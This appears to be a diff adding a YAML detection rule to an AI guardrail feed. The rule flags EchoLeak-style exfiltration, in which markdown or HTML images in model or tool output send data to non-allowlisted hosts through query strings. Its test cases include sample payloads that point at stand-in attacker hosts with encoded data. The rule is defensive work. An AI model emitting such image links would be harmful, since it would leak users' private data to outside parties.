@@ -1,0 +1,52 @@
+# AEGIS-TI-014 - ported from staging/feed-seed by feed_service/port_staging.py (contract shape, CONTRACTS 4.7)
+id: AEGIS-TI-014
+title: Markdown / URL data exfiltration (EchoLeak)
+description: >-
+  EchoLeak (CVE-2025-32711) was a zero-click M365 Copilot exfiltration that used
+  reference-style markdown images and links to carry data to an attacker host when
+  the client auto-fetched the image. Matches markdown/HTML images (inline, reference
+  and <img>) that point at a host NOT on the egress allowlist and carry a query
+  string. Images to allowlisted hosts are left alone here (see AEGIS-TI-022 for the
+  allowlisted-proxy abuse variant). Redacts the link and alerts.
+status: stable
+severity: high
+confidence: high
+aliases: [CVE-2025-32711]
+references:
+  - https://cveawg.mitre.org/api/cve/CVE-2025-32711
+tags: [LLM02:2026, LLM10:2026, ASI01, CWE-200]
+published: "2025-06-11"
+modified: "2026-10-03"
+applies_to:
+  surfaces: [model.response, tool.output, mcp.result, tool.input, mcp.call]
+match:
+  type: url
+  extract: markdown
+  kinds: [image, refdef, html_img]
+  query_min_length: 1
+  host_not_in:
+    - "api.openai.com"
+    - "api.anthropic.com"
+    - "huggingface.co"
+    - "registry.ollama.ai"
+    - "assets.aegis-corp.example"
+    - "*.aegis-corp.example"
+    - assets.acme-capital.example
+    - '*.acme-capital.example'
+action: redact
+message: "Markdown image/link exfiltrates data to a non-allowlisted host via its query string (EchoLeak pattern). Link redacted."
+tests:
+  positive:
+    - name: inline markdown image to an attacker host with a data query
+      surface: model.response
+      text: "Here is your summary.\n\n![pixel](https://exfil.attacker.example/collect?d=QUJDREVG)"
+    - name: reference-style image definition to a non-allowlisted host
+      surface: model.response
+      text: "See the chart ![c][c]\n\n[c]: https://logger.evil.example/i.png?s=Zm9vYmFy"
+  negative:
+    - name: image from an allowlisted host (left to AEGIS-TI-022)
+      surface: model.response
+      text: "![diagram](https://assets.acme-capital.example/img/proxy?src=https://cdn.example/x.png&ref=UECB3F2A9)"
+    - name: plain external image with no query string
+      surface: model.response
+      text: "![logo](https://huggingface.co/front/assets/logo.png)"
